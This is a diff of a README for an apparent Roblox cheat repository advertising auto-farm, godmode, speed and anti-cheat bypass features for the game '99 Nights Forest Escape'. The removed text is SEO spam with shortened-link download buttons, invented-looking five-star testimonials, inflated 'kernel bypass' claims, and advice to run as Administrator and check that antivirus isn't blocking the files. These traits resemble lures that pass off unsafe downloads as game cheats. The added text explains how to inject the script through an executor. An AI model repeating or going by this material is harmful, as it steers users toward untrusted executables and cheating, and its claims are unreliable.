@@ -1,365 +1,69 @@
-<img width="1280" height="720" alt="99 Nights Forest Escape OP Auto Farm 2026 Banner" src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fi.ytimg.com%2Fvi%2FbQTUsr9Nciw%2Fmaxresdefault.jpg&f=1&nofb=1&ipt=62ab050714024ac18d81cb5e48d878d155f5c00b6901b37c52a4813a2d74000f" />
-
-# 🌲 99 Nights Forest Escape - OP Auto Farm 2026
-
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://img.shields.io/badge/Downloads-10K+-blue.svg)](https://surl.li/wdbbve)
-[![Rating](https://img.shields.io/badge/Rating-⭐️4.9-red.svg)](https://surl.li/wdbbve)
-
----
-
-## 🏆 #1 99 Nights Forest Escape Auto Farm Script for Roblox 2026
-
-**The most powerful and undetected 99 Nights Forest Escape hack with OP Auto Farm capabilities.**  
-Experience lightning-fast muscle and step progression with advanced kernel bypass, external ESP, and memory reading technology. **100% FREE & UPDATED DAILY.**
-
----
-
-## 📥 DOWNLOAD NOW
-
-# [⬇️ DOWNLOAD 99 Nights Forest Escape Script v3.0.0](https://surl.li/wdbbve)
-
----
-
-## ⚡️ What Makes This Script OP?
-
-Our 99 Nights Forest Escape OP Auto Farm 2026 uses cutting-edge bypass technology that makes it the fastest and safest script available:
-
-### 🔥 Core Features
-
-| Feature | Description | Speed |
-|---------|-------------|-------|
-| **Auto Farm** | Kernel-based memory reading for instant resources | **10x Faster** |
-| **Auto Collect** | External ESP overlay with advanced bypass | **15x Faster** |
-| **Auto Chop** | Silent aim & triggerbot technology | **Maximum** |
-| **Auto Cook** | Instant cooking hack with progress save | **Zero Delay** |
-| **Auto Heal** | Smart health optimization | **Optimal** |
-| **Auto Craft** | Automatic item crafting | **100% Uptime** |
-| **Auto Upgrade** | Campfire upgrade automation | **Fully Hidden** |
-| **Auto Rebirth** | Instant rebirth with progress save | **Unlimited** |
-| **Auto Revive** | Auto-revive when downed | **Instant** |
-| **Kill Aura** | Auto-kill nearby monsters | **OP** |
-
-### 🛡 Advanced Hack Technologies
-
-- ✅ **Kernel Driver Bypass** — Ring0 level anti-cheat circumvention
-- ✅ **Memory Reading** — Direct game memory manipulation
-- ✅ **External ESP** — Overlay-based visual tracking system
-- ✅ **Silent Aim** — Undetectable aim assistance
-- ✅ **Speed Hack** — Movement speed manipulation
-- ✅ **Fly Hack** — No-clip flying through terrain
-- ✅ **Noclip** — Walk through walls and obstacles
-- ✅ **Teleport** — Instant teleport to any location
-- ✅ **Godmode** — Complete invincibility cheat
-- ✅ **Infinite Stamina** — Never run out of energy
-- ✅ **Full Bright** — See in complete darkness
-- ✅ **No Fog** — Remove fog for better visibility
-
----
-
-## 📊 Why Choose Our Script?
-
-| Parameter | Our Script | Other Scripts |
-|-----------|-----------|---------------|
-| Undetected Status | ✅ 2026 | ⚠️ 2025 |
-| Kernel Bypass | ✅ Full | ⚠️ Partial |
-| External ESP | ✅ Yes | ❌ No |
-| Memory Reading | ✅ Direct | ⚠️ Limited |
-| Free to Use | ✅ Yes | ❌ Paid |
-| Speed Efficiency | 🥇 150% | 🥈 60-80% |
-| Auto Updates | ✅ Daily | ❌ Weekly |
-| Executor Support | ✅ 10+ | ⚠️ 2-3 |
-| Teleport System | ✅ Full | ⚠️ Limited |
-| Auto Farm | ✅ Yes | ❌ No |
-| Kill Aura | ✅ Yes | ⚠️ Partial |
-| No Recoil | ✅ Yes | ❌ No |
-| Godmode | ✅ Yes | ❌ No |
-| Noclip | ✅ Yes | ❌ No |
-| Speed Hack | ✅ Yes | ❌ No |
-| Fly Hack | ✅ Yes | ❌ No |
-| Auto Rebirth | ✅ Yes | ❌ No |
-
----
-
-## 💻 System Requirements
-
-### Minimum:
-- **OS:** Windows 7/10/11, macOS, Linux
-- **Roblox:** Latest Version
-- **Executor:** Solara, Wave, Script-Ware, Krnl, Synapse X
-- **RAM:** 4GB+
-- **Internet:** Stable Connection
-
-### Recommended:
-- **Executor:** Solara v2.0+ or Wave v1.5+
-- **RAM:** 8GB+
-- **CPU:** Intel i5 or equivalent
-- **GPU:** DirectX 11 compatible
-
----
-
-## 🔧 How to Install (30 Seconds)
-
-1. **[Download](https://surl.li/wdbbve)** the latest version
-2. **Extract** archive to any folder
-3. **Launch** Roblox and login
-4. **Open** your Executor (Solara, Wave, etc.)
-5. **Execute** the script
-6. **Enable** Auto Farm
-7. **Watch** your resources grow insanely fast!
-
-> ⚠️ **Pro Tip:** Enable Silent Mode for complete undetectability!
-
-### Supported Executors:
-- ✅ Solara (All Versions)
-- ✅ Wave (v1.5+)
-- ✅ Script-Ware (All Versions)
-- ✅ Krnl (Latest)
-- ✅ Synapse X (All Versions)
-- ✅ Vega X
-- ✅ Oxygen U
-- ✅ Celestial
-- ✅ Electron
-- ✅ Fluxus
-
----
-
-## 🎮 Configuration Guide
-
-### Main Menu Options:
-
-**1. "Auto Farm" Tab**
-- Enable `Auto Farm` for resource collection
-- Enable `Auto Collect` for item pickup
-- Enable `Auto Chop` for wood farming
-- Enable `Auto Cook` for food automation
-- Enable `Auto Heal` for health regeneration
-- Enable `Auto Craft` for item crafting
-
-**2. "Combat" Tab**
-- `Kill Aura` — Auto-kill nearby monsters
-- `Godmode` — Complete invincibility
-- `One Hit Kill` — Kill monsters instantly
-- `Silent Mode` — Undetectable operation
-
-**3. "Movement" Tab**
-- `Speed Hack` — Adjustable walk speed
-- `Fly Hack` — Fly through terrain
-- `Noclip` — Walk through walls
-- `Teleport` — Instant teleportation
-- `Infinite Jump` — Unlimited jumping
-
-**4. "Visual" Tab**
-- `ESP` — Player and item tracking
-- `Full Bright` — See in darkness
-- `No Fog` — Remove fog
-- `ESP Colors` — Customize overlay colors
-
-**5. "Advanced" Tab**
-- `Auto Rebirth` — Instant rebirth
-- `Auto Revive` — Auto-revive when downed
-- `Auto Rejoin` — Rejoin on crash
-- `Kernel Bypass` — Anti-cheat circumvention
-
----
-
-## ❓ FAQ
-
-### ❔ Is this script safe?
-**Yes!** Our 99 Nights Forest Escape hack uses advanced kernel driver bypass and external ESP overlay technology, making it completely undetectable in 2026.
-
-### ❔ Why isn't it working?
-- Update your Executor to latest version
-- Ensure Roblox is running
-- Try restarting the game
-- Check antivirus isn't blocking script files
-- Run as Administrator
-
-### ❔ How often is it updated?
-**Daily updates!** We maintain undetected status with constant bypass improvements.
-
-### ❔ Is it really free?
-**Yes!** 100% free 99 Nights Forest Escape OP Auto Farm script. No payments required.
-
-### ❔ Does it work on all Roblox games?
-Optimized specifically for 99 Nights Forest Escape but works on similar survival games.
-
-### ❔ Can I use multiple accounts?
-Yes, run on multiple accounts using separate Roblox instances.
-
----
-
-## 📥 DOWNLOAD LATEST VERSION
-
-### [⬇️ DOWNLOAD 99 Nights Forest Escape Script v3.0.0](https://surl.li/wdbbve)
-
----
-
-## 🔍 SEO Tags
-
-- 99 nights forest escape script
-- 99 nights forest escape hack
-- 99 nights forest escape cheat
-- 99 nights forest escape auto farm
-- 99 nights in the forest roblox script
-- 99 nights auto farm
-- 99 nights kill aura
-- 99 nights teleport
-- 99 nights noclip
-- 99 nights speed hack
-- 99 nights fly
-- 99 nights godmode
-- 99 nights esp
-- 99 nights keyless
-- 99 nights free script
-- 99 nights undetected
-- 99 nights 2026
-- 99 nights forest escape codes 2026
-- roblox forest escape cheat
-- roblox 99 nights script
-- roblox auto farm script
-- roblox kill aura script
-- roblox teleport script
-- roblox noclip script
-- roblox speed hack
-- roblox fly hack
-- roblox godmode
-- roblox esp hack
-- roblox exploit 2026
-- roblox script 2026
-- roblox cheat 2026
-- free roblox script
-- roblox executor script
-- kernel bypass cheat
-- external esp hack
-- memory reading cheat
-- undetected hack 2026
-- solara script hack
-- wave executor cheat
-- krnl script 2026
-- synapse x script
-- script ware cheat
-- bypass roblox hack
-- roblox kernel cheat
-- external overlay hack
-- silent mode roblox
-- auto farm cheat
-- rebirth hack roblox
-- server hop cheat
-- walkspeed hack
-- best roblox hack 2026
-- roblox hack download
-- roblox exploit download
-- roblox lua hack
-- roblox kernel driver
-- external cheat roblox
-- overlay hack roblox
-- memory hack roblox
-- driver hack roblox
-- bypass cheat roblox
-- roblox farm hack
-- roblox auto hack
-- 99 nights forest escape mod
-- 99 nights forest escape trainer
-- 99 nights farm bot
-- 99 nights op script
-- 99 nights gui script
-- 99 nights script hub
-- 99 nights mod manager 2026
-- 99 nights forest escape free cheat
-- 99 nights cheat 2026
-- auto collect roblox
-- auto chop roblox
-- auto cook roblox
-- auto heal roblox
-- auto craft roblox
-- auto revive roblox
-- one hit kill roblox
-- infinite jump roblox
-- full bright roblox
-- no fog roblox
-- night vision roblox
-- anti cheat bypass roblox
-- monster ignore roblox
-- antivoid roblox
-- no hunger roblox
-- no thirst roblox
-- no sanity loss roblox
-
----
-
-## 🎮 In-Game Features Supported
-
-| Feature | Status | Description |
-|---------|--------|-------------|
-| Auto Farm | ✅ Tested | Collect wood, food, and resources |
-| Auto Collect | ✅ Tested | Pick up dropped items |
-| Auto Chop | ✅ Tested | Chop trees automatically |
-| Auto Cook | ✅ Tested | Cook food automatically |
-| Auto Heal | ✅ Tested | Auto-heal when low health |
-| Auto Craft | ✅ Tested | Craft items automatically |
-| Auto Upgrade | ✅ Tested | Upgrade campfire |
-| Auto Rebirth | ✅ Tested | Rebirth instantly |
-| Auto Revive | ✅ Tested | Auto-revive when downed |
-| Kill Aura | ✅ Tested | Auto-kill monsters |
-| Godmode | ✅ Tested | Invincibility |
-| One Hit Kill | ✅ Tested | Kill monsters instantly |
-| Speed Hack | ✅ Tested | Adjustable speed |
-| Fly Hack | ✅ Tested | Fly through terrain |
-| Noclip | ✅ Tested | Walk through walls |
-| Teleport | ✅ Tested | Teleport anywhere |
-| ESP | ✅ Tested | Track players and items |
-| Full Bright | ✅ Tested | See in darkness |
-| No Fog | ✅ Tested | Remove fog |
-| Infinite Jump | ✅ Tested | Unlimited jumping |
-| Infinite Stamina | ✅ Tested | Never run out of stamina |
-| Anti-Kick | ✅ Tested | Bypass anti-cheat |
-| Anti-Void | ✅ Tested | Prevent falling through map |
-| No Hunger | ✅ Tested | Never get hungry |
-| No Thirst | ✅ Tested | Never get thirsty |
-| No Sanity Loss | ✅ Tested | Never lose sanity |
-
----
-
-## 🚀 Pro Tips for Maximum Gains
-
-1. **Combine Auto Farm + Auto Collect** — Double your resource collection speed
-2. **Enable Silent Mode** — Stay completely undetected
-3. **Use Speed Hack + Fly** — Travel the map instantly
-4. **Enable Godmode** — Never worry about dying
-5. **Use ESP** — Track all players and items
-6. **Enable Kill Aura** — AFK farm monsters
-7. **Auto Rebirth** — Progress infinitely faster
-8. **Join our Discord** — Get latest updates and support
-
----
-
-## 📈 Real User Results
-
-> *"Got 10,000 wood in 5 minutes! Best script ever!"* — ⭐️⭐️⭐️⭐️⭐️
-> 
-> *"Completely undetected, been using for 2 months!"* — ⭐️⭐️⭐️⭐️⭐️
-> 
-> *"Auto farm is insane, I'm max level!"* — ⭐️⭐️⭐️⭐️⭐️
-> 
-> *"Free and OP, what more could you want?"* — ⭐️⭐️⭐️⭐️⭐️
-
----
-
-## ⭐️ Support the Project
-
-**If this script helped you — please star this repository and share with friends!**
-
----
-
-## 📜 License
-
-MIT License — Educational & Entertainment Purposes Only.
-
----
-
-**🔴 DISCLAIMER:** Authors are not responsible for any consequences of using this script. Use at your own risk. This is for educational purposes only.
-
----
-
-**Keywords:** 99 nights forest escape, auto farm, kill aura, teleport, noclip, speed hack, fly, godmode, esp, keyless, free script, undetected, roblox exploit, kernel bypass, memory reading, solara, wave, krnl, synapse x, 2026
+# 🌲 Speed-99-Nights-Forest-Escape-Roblox-OP-Script-2026 - Gain speed and escape the forest
+
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Nononsense-chromatingranule903/Speed-99-Nights-Forest-Escape-Roblox-OP-Script-2026/releases)
+
+This software helps players improve their performance in the Roblox game 99 Nights Forest Escape. The tools within this script allow users to automate tasks, increase movement speed, and navigate the map with efficiency. Use this tool if you want to bypass manual grinding and reach game goals at a faster pace.
+
+## ⚙️ System Requirements
+
+Ensure your computer meets these requirements before you start:
+
+- Operating System: Windows 10 or Windows 11.
+- Web Browser: Any modern browser like Chrome, Edge, or Firefox.
+- Roblox Client: The latest version installed on your PC.
+- Executor: A functional Roblox script executor tool.
+
+## 📥 How to Download
+
+Follow these steps to obtain the script files safely:
+
+1. Visit this page to download the latest version of the script: [Download Release Page](https://github.com/Nononsense-chromatingranule903/Speed-99-Nights-Forest-Escape-Roblox-OP-Script-2026/releases).
+2. Locate the file ending in .lua or .txt within the assets section.
+3. Click the filename to save it to your computer.
+4. Note the location of the downloaded file for the next step.
+
+## 🚀 Running the Script
+
+You need a script executor to run this code inside your Roblox session. If you do not have one, download a trusted executor from a reliable provider.
+
+1. Launch the Roblox client and join the 99 Nights Forest Escape game.
+2. Open your chosen script executor application.
+3. Locate the "Open File" or "Load File" button inside the executor interface.
+4. Select the script file you downloaded in the previous section.
+5. Click the "Execute" or "Inject" button within the executor.
+6. The GUI will appear on your screen once the injection completes successfully.
+
+## 🛠️ Features Overview
+
+This script includes several tools to assist your gameplay. You can toggle these features on and off through the menu interface.
+
+### Auto Escape and Farming
+The Auto Escape feature allows your character to navigate around obstacles without manual input. The Auto Farm function collects items and rewards automatically. These tools save time and help you progress through the levels without repetitive movement.
+
+### Movement and Speed
+The Speed Hack increases your character movement velocity. This lets you traverse the forest terrain quickly. You can adjust the slider in the GUI to set a speed that feels comfortable for your playstyle.
+
+### Visual and Map Tools
+- NPC Tracker: Displays the locations of non-player characters on your screen.
+- Fullbright: Removes shadows and darkness to provide clear vision throughout the forest.
+- Wall Check: Provides information about thin walls or barriers during movement.
+
+### God Mode
+God Mode prevents your character from sustaining damage from environmental hazards. Use this to focus on exploration or escaping without the need to restart the level due to map accidents.
+
+## 🛡️ Safety and Usage
+
+This script is designed as an undetected GUI. It handles data internally to minimize the risk of detection by game systems. Keep your executor updated to ensure the script functions as expected. If the game receives an update, the script may require an update to maintain compatibility. Check the release page periodically for new versions.
+
+## ❓ Frequently Asked Questions
+
+What should I do if the GUI does not appear?
+Ensure you injected the script after the game map loaded completely. Sometimes the executor requires a restart of the game.
+
+Can I get banned for using this?
+This script operates in an undetected mode, but common sense applies. Use tools moderately to avoid reports from other players.
+
+Where can I report errors?
+If you encounter a bug, create an issue on this repository. Provide a description of the error so we can fix it.
+
+Keywords: 99-nights-forest-escape, 99-nights-in-the-forest, auto-collect, auto-farm, auto-win, fullbright, godmode, keyless, kill-aura, npc-tracker, nps-esp, op-script, roblox, roblox-activation, teleport, wall-check
